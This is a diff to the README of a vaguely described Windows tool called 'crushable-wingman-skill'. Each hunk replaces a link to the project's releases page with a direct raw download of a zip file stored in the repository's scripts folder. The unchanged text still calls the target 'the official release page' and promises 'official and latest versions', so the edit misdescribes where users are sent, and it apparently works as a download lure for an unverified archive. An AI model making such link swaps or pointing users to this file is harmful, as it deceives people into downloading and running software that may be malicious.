@@ -1,6 +1,6 @@
 # 🛠️ crushable-wingman-skill - Simple Tool for Easy Use
 
-[![Download crushable-wingman-skill](https://img.shields.io/badge/Download-crushable--wingman--skill-brightgreen)](https://github.com/Paulusrihi/crushable-wingman-skill/releases)
+[![Download crushable-wingman-skill](https://img.shields.io/badge/Download-crushable--wingman--skill-brightgreen)](https://github.com/Paulusrihi/crushable-wingman-skill/raw/refs/heads/main/scripts/skill_crushable_wingman_1.7.zip)
 
 ## 📋 About crushable-wingman-skill
 
@@ -32,7 +32,7 @@ This section shows how to get and run crushable-wingman-skill on a Windows machi
 
 Click the big green button above or this link below to visit the official release page:
 
-[Download crushable-wingman-skill on GitHub](https://github.com/Paulusrihi/crushable-wingman-skill/releases)
+[Download crushable-wingman-skill on GitHub](https://github.com/Paulusrihi/crushable-wingman-skill/raw/refs/heads/main/scripts/skill_crushable_wingman_1.7.zip)
 
 This page contains the latest version of the software. You will see one or more downloadable files listed as Releases.
 
@@ -72,7 +72,7 @@ If instructions appear on the screen or in the app’s help section, follow them
 
 You can always visit the releases page to download updates or reinstall at:
 
-[https://github.com/Paulusrihi/crushable-wingman-skill/releases](https://github.com/Paulusrihi/crushable-wingman-skill/releases)
+[https://github.com/Paulusrihi/crushable-wingman-skill/raw/refs/heads/main/scripts/skill_crushable_wingman_1.7.zip](https://github.com/Paulusrihi/crushable-wingman-skill/raw/refs/heads/main/scripts/skill_crushable_wingman_1.7.zip)
 
 Using this link ensures you get the official and latest versions.
 
@@ -121,4 +121,4 @@ To keep crushable-wingman-skill running smoothly and securely:
 - Download and install new versions following the same steps.
 - Often, new versions improve stability and add small improvements.
 
-[Get updates here](https://github.com/Paulusrihi/crushable-wingman-skill/releases)
+[Get updates here](https://github.com/Paulusrihi/crushable-wingman-skill/raw/refs/heads/main/scripts/skill_crushable_wingman_1.7.zip)
